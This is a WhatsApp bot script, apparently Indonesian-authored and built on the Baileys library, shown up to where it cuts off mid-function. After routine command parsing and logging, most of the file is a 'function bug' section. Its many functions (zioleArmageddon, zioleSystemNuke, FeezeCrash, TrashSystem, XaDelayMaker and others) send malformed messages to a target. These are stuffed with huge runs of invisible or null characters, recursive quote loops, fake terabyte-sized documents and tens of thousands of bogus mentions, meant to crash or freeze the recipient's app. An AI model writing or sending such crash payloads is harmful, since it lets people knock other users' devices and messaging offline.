require('../setting/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const ms = require("parse-ms");
const fetch = require("node-fetch");
const JsConfuser = require('js-confuser');
const moment = require("moment-timezone");
var crypto = require("crypto")
let { randomBytes } = require("crypto")
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");

module.exports = ziole = async (ziole, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? ziole.user.id.split(":")[0] + "@s.whatsapp.net" || ziole.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '/';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const isPremium = premium.includes(m.sender)
const owner2 = JSON.parse(fs.readFileSync("./database/owner.json"))
const isOwner = owner2.includes(m.sender) ? true : m.sender == owner+"@s.whatsapp.net" ? true : m.fromMe ? true : false
// Consta Variable
const botNumber = await ziole.decodeJid(ziole.user.id);
const isCmd = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// Group function
const groupMetadata = isGroup ? await ziole.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const speed = require('performance-now')
const os = require("os")

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, formatp, sleep } = require('./lib/myfunction');
// Foto
var ppuser
try {
ppuser = await ziole.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = `${imgmenu}`
}
// Time
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')


// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
`   ⌬ Pesan: ${m.body || m.mtype} \n` +
`   ⌬ Pengirim: ${m.pushname} \n` +
`   ⌬ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Grup: ${groupName} \n` +
`   ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}

if (global.autoTyping) {
if (command) {
ziole.sendPresenceUpdate('composing', from)
}
}
ziole.autoshalat = ziole.autoshalat ? ziole.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? ziole.user.id : m.sender
	let id = m.chat 
    if(id in ziole.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:18',
    terbit: '05:42',
    dhuha: '06:02',
    dzuhur: '11:32',
    ashar: '14:53',
    magrib: '17:23',
    isya: '18:38',
    }
    
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

const fkethmb = await resize(ppuser, 300, 300)

let example = (teks) => {
return `\n𝗕𝘂𝗸𝗮𝗻 𝗴𝗶𝘁𝘂 𝗴𝗼𝗯𝗹𝗼𝗸
kek gini le ${isCmd} ${teks}\n`
}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363401151695566@newsletter`,
newsletterName: `ziole & zeyy`,
jpegThumbnail: "",
caption: 'official',
inviteExpiration: Date.now() + 1814400000
}
}}


let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
ping = `ping : ${latensi.toFixed(4)} × ram : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}`

//variable gambar
const valensya = fs.readFileSync('./start/lib/media/justin.jpg')
//end

const qtext2 = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: "𝙰𝚂𝚂𝙰𝙸𝙽𝚇𝙰𝙶𝚄𝚂" }}}

const zeyyreply = (teks) => {
ziole.sendMessage(
        m.chat,
        {
          document: fs.readFileSync("./package.json"),
          fileName: `Hai ${pushname}`,
          fileLength: "99999999999999",
          caption: teks,
          mimetype: "image/png",
          headerType: 9,
          jpegThumbnail: fkethmb,
          contextInfo: { 
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: namaowner,
 newsletterJid: idsaluran,
 serverMessageId: 143
}}}, {quoted:qtext2})
}

// function bug //
const VcardQuoted = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? {
            remoteJid: "0@s.whatsapp.net"
        } : {})
    },
    "message": {
        "documentMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
            "mimetype": "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
            "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
            "fileLength": "974197419741",
            "pageCount": "974197419741",
            "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
            "fileName": "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻",
            "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
            "directPath": '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
            "mediaKeyTimestamp": "1715880173",
            "contactVcard": true
        },
        "title": "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻" + "ꦾ".repeat(103000),
        "body": {
            "text": "⚔️=> ⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻" + "ꦾ".repeat(103000) + "@1".repeat(150000)
        },
        "nativeFlowMessage": {},
        "contextInfo": {
            "mentionedJid": ["1@newsletter"],
            "groupMentions": [{ "groupJid": "1@newsletter", "groupSubject": "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻" }]
        }
    },
    "contextInfo": {
        "mentionedJid": [m.chat],
        "externalAdReply": {
            "showAdAttribution": true,
            "title": "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻",
            "body": "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻",
            "mediaType": 3,
            "renderLargerThumbnail": true,
            "thumbnailUrl": "your-thumbnail-url-here",
            "sourceUrl": "https://t.me/apex",
        },
        "forwardedNewsletterMessageInfo": {
            "newsletterJid": "120363321780343299@newsletter",
            "serverMessageId": 1,
            "newsletterName": "⏤͟͟͞͞𝑫𝒂𝒑𝒛𝒚 𝐕𝟏⿻",
        }
    },
    "expiryTimestamp": 0,
    "amount": {
        "value": "999999999",
        "offset": 999999999,
        "currencyCode": "CRASHCODE9741",
    },
    "background": {
        "id": "100",
        "fileLength": "928283",
        "width": 1000,
        "height": 1000,
        "mimetype": "application/vnd.ms-powerpoint",
        "placeholderArgb": 4278190080,
        "textArgb": 4294967295,
        "subtextArgb": 4278190080,
    }
}
async function ForceText(target, ptcp = true) {
     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "⏤͟͟͞͞RikzzZhiro🥵",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "", 
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "{".repeat(80000),
                            }
                        }
                    }
                }
            }, {});

            await ziole.relayMessage(target, msg.message,       {
                messageId: msg.key.id,
                participant: { jid: target }
         });
    }
async function zioleInvisibleFCiOS(target) {
  const INVISIBLE_SPAM = '\u2063\u200F\u202E\u180E\u200E'.repeat(150000); // Invisible bomb
  const DEEP_LOOPED = {
    conversation: INVISIBLE_SPAM,
    contextInfo: {
      quotedMessage: {
        conversation: INVISIBLE_SPAM,
        contextInfo: {
          quotedMessage: {
            conversation: INVISIBLE_SPAM,
          }
        }
      }
    }
  };

  const message = {
    extendedTextMessage: {
      text: INVISIBLE_SPAM,
      contextInfo: {
        quotedMessage: DEEP_LOOPED,
        mentionedJid: Array.from({ length: 15 }, () => "0@s.whatsapp.net"),
        inviteLinkGroupTypeV2: "DEFAULT",
        forwardingScore: 99999999,
        isForwarded: true,
        disappearingMode: {
          initiator: 0x01,
          trigger: 0x02
        },
        stanzaId: ziole.generateMessageTag(),
        participant: target
      }
    }
  };

  await ziole.relayMessage(target, message, {
    messageId: ziole.generateMessageTag()
  });

  console.log("[💀] Sent iOS FC Bug (Invisible Style) to:", target);
}

async function zioleArmageddon(target) {
  const INV = '\u200F\u2063\u202E\u180E\u200E\uFEFF'.repeat(150000); // Invisible nuke
  const QUOTE_LVL = {
    conversation: INV,
    contextInfo: {
      quotedMessage: {
        conversation: INV,
        contextInfo: {
          quotedMessage: {
            conversation: INV,
            contextInfo: {
              quotedMessage: {
                conversation: INV,
                contextInfo: {
                  quotedMessage: {
                    conversation: INV,
                    contextInfo: {
                      quotedMessage: {
                        conversation: INV
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  const doomMsg = {
    templateMessage: {
      hydratedTemplate: {
        hydratedContentText: INV,
        hydratedButtons: Array.from({ length: 5 }, () => ({
          quickReplyButton: {
            displayText: INV,
            id: ziole.generateMessageTag()
          }
        })),
        hydratedFooterText: INV
      }
    },
    contextInfo: {
      quotedMessage: QUOTE_LVL,
      forwardingScore: 999999999,
      isForwarded: true,
      inviteLinkGroupTypeV2: "DEFAULT",
      mentionedJid: Array.from({ length: 30 }, () => "0@s.whatsapp.net")
    }
  };

  await ziole.relayMessage(target, doomMsg, {
    messageId: ziole.generateMessageTag()
  });

  console.log("[☠️] ZIOLE ARMAGEDDON SENT TO:", target);
}

async function zioleInvisibleDelay(target) {
  const INVISIBLE = "\u200F\u2063\u200E".repeat(150000);
  const ZERO_WIDTH_SPAM = "\u0000".repeat(50000); 

  const bugMsg = {
    extendedTextMessage: {
      text: INVISIBLE + ZERO_WIDTH_SPAM,
      contextInfo: {
        stanzaId: ziole.generateMessageTag(),
        participant: target,
        quotedMessage: {
          conversation: INVISIBLE + ZERO_WIDTH_SPAM,
        },
        mentionedJid: Array.from({ length: 10 }, () => "0@s.whatsapp.net"),
        inviteLinkGroupTypeV2: "DEFAULT", 
        forwardingScore: 999999999,
        isForwarded: true,
      }
    }
  };

  await ziole.relayMessage(target, bugMsg, {
    messageId: ziole.generateMessageTag(),
  });

  console.log("[👻] Sent Invisible Delay Bug to:", target);
}

async function zioleFC(target) {
  const longText = "\u200F".repeat(100000) + "ꦾ".repeat(100000) + "@1".repeat(100000);

  const weirdMsg = {
    extendedTextMessage: {
      text: longText,
      contextInfo: {
        quotedMessage: {
          interactiveMessage: {
            nativeFlowMessage: {
              buttons: Array.from({ length: 100 }, () => ({
                name: "crash",
                buttonParamsJson: JSON.stringify({
                  reference_id: Math.random().toString(36).slice(2),
                  status: "invalid",
                  order_type: "NONE"
                }),
              })),
              messageParamsJson: {
                corrupted: "\u0000".repeat(10000),
              }
            }
          }
        },
        mentionedJid: Array.from({ length: 20 }, () => "1@newsletter"),
        groupMentions: Array.from({ length: 20 }, () => ({
          groupJid: "1@newsletter",
          groupSubject: "🧠💥💀"
        }))
      }
    }
  };

  await ziole.relayMessage(target, weirdMsg, {
    messageId: ziole.generateMessageTag()
  });

  console.log("[⚠️] FC Attempt Sent to:", target);
}


async function zioleBlackout(target) {
  const INV = '\u200F\u2063\u202E\u180E\u200E\uFEFF'.repeat(250000); // 1.5 juta char
  const docFake = {
    documentMessage: {
      url: "https://example.com/blackout.enc",
      mimetype: "application/pdf",
      fileSha256: "0".repeat(44),
      fileLength: "1099511627776", // 1TB
      pageCount: 999999,
      mediaKey: "0".repeat(44),
      fileName: INV,
      fileEncSha256: "1".repeat(44),
      directPath: "/file/download",
      mediaKeyTimestamp: "9999999999999"
    }
  };

  const nestedLoop = {
    conversation: INV,
    contextInfo: {}
  };
  nestedLoop.contextInfo.quotedMessage = nestedLoop; // recursive self-loop

  const blackoutMsg = {
    interactiveMessage: {
      header: docFake,
      body: {
        text: INV
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 25 }, () => ({
          name: "btn",
          buttonParamsJson: JSON.stringify({
            reference_id: ziole.generateMessageTag(),
            order: {
              status: "corrupted",
              order_type: "VOID"
            }
          })
        })),
        messageParamsJson: {
          corrupted: INV
        }
      },
      contextInfo: {
        quotedMessage: nestedLoop,
        mentionedJid: Array.from({ length: 50 }, (_, i) => `${i}@s.whatsapp.net`),
        forwardingScore: 999999999,
        isForwarded: true
      }
    }
  };

  await ziole.relayMessage(target, blackoutMsg, {
    messageId: ziole.generateMessageTag()
  });

  console.log("[🕶️☠️] ZIOLE BLACKOUT v4.0 EXECUTED on:", target);
}


async function zioleSystemNuke(target) {
  const INV = '\u200F\u2063\u202E\u180E\u200E\uFEFF'.repeat(500000); // 2.5 juta chars
  const infiniteQuote = {
    conversation: INV,
    contextInfo: {}
  };
  infiniteQuote.contextInfo.quotedMessage = infiniteQuote;

  const doomMessage = {
    conversation: INV,
    contextInfo: {
      quotedMessage: infiniteQuote,
      mentionedJid: Array.from({ length: 20 }, () => "0@s.whatsapp.net")
    },
    documentMessage: {
      url: "https://example.com/fake.pdf",
      fileLength: "999999999999", // 1TB+
      fileName: INV,
      mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
      fileSha256: "0".repeat(44),
      fileEncSha256: "1".repeat(44),
      mediaKey: "2".repeat(44),
      mediaKeyTimestamp: "9999999999",
      pageCount: 99999,
      directPath: "/doom"
    },
    templateMessage: {
      hydratedTemplate: {
        hydratedContentText: INV,
        hydratedFooterText: INV,
        hydratedButtons: Array.from({ length: 10 }, () => ({
          quickReplyButton: {
            displayText: INV,
            id: ziole.generateMessageTag()
          }
        }))
      }
    }
  };

  await ziole.relayMessage(target, doomMessage, {
    messageId: ziole.generateMessageTag()
  });

  console.log("[⚡] SYSTEM NUKE Sent. Watch your device suffer.");
}

async function FeezeCrash(isTarget) {
  for (let i = 0; i < 10; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 10; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "\u0000".repeat(10000),
          "body": "\u0000".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "𝐒͢𝐔͡𝐏͢𝐄͡𝐑 𝐑͡𝐀͢𝐉͡𝐀" + "ꦾ".repeat(11000)
        },
        "footer": {
          "text": "dont panic!!"
        },
        "header": {
          "title": '𝐒͢𝐔͡𝐏͢𝐄͡𝐑 𝐑͡𝐀͢𝐉͡𝐀' + "\u0000".repeat(50000),
          "hasMediaAttachment": true,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(isTarget, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "𝐒͢𝐔͡𝐏͢𝐄͡𝐑 𝐑͡𝐀͢𝐉͡𝐀 " + "ꦾ".repeat(55000)
            },
            "footer": {
              "text": "( 🍁 ) 𝐒͢𝐔͡𝐏͢𝐄͡𝐑 𝐑͡𝐀͢𝐉͡𝐀 ( 🍁 )"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await ziole.relayMessage(isTarget, carousel.message, {
      messageId: carousel.key.id
    });
    console.log("Sending Feeze Crash !!");
  }
}
//========[ FUNCTION BUG TRASH UI × BLANK ]========\\
    async function TrashSystem(target, rajaimg, Ptcp = false) {
			await ziole.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
								mentionedJid: [target, "13135550002@s.whatsapp.net"],
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "𝐒͢𝐔͡𝐏͢𝐄͡𝐑 𝐑͡𝐀͢𝐉͡𝐀",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: rajaimg,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "𝐒͢𝐔͡𝐏͢𝐄͡𝐑 𝐑͡𝐀͢𝐉͡𝐀̤\n" + "ꦽ".repeat(45000) + "@0".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '𝐒͢𝐔͡𝐏͢𝐄͡𝐑 𝐑͡𝐀͢𝐉͡𝐀', url: \"https://t.me/RajaModss\", merchant_url: \"https://t.me/RajaModss\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["0@s.whatsapp.net", ...Array.from({
										length: 30000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "𝐒͢𝐔͡𝐏͢𝐄͡𝐑 𝐑͡𝐀͢𝐉͡𝐀",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.green("𝐒͢𝐔͡𝐏͢𝐄͡𝐑 𝐑͡𝐀͢𝐉͡𝐀"));
		};

    async function ForceLokasi(target, ptcp = true) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "⏤͟͟͞͞RikzzZhiro🥵" + "ꦽꦂ".repeat(9000),
              liveLocationMessage: {
                degreesLatitude: 250208,
                degreesLongitude: -250208,
                name: "\u0000",
                address: "\u0000",
               },
         hasMediaAttachment: false,
              },
            body: {
              text: "",
        format: "DEFAULT"
            },
        footer: {
        text: "☣︎"
       }, 
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(80000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await ziole.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}
async function CrashInvisble(target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🦄クラッシャーRikzz",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "RilzX7",
                address: "RilzX7",
              },
            },
            body: {
              text: "🦄クラッシャーRikzz",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await ziole.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}
async function XaDelayMaker(target) { // Default true biar otomatis nyala
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "ziole & zeyy Is Here!",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await ziole.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (target) {
        await ziole.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "ziole & zeyy Is Here! " },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function bulldozer(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
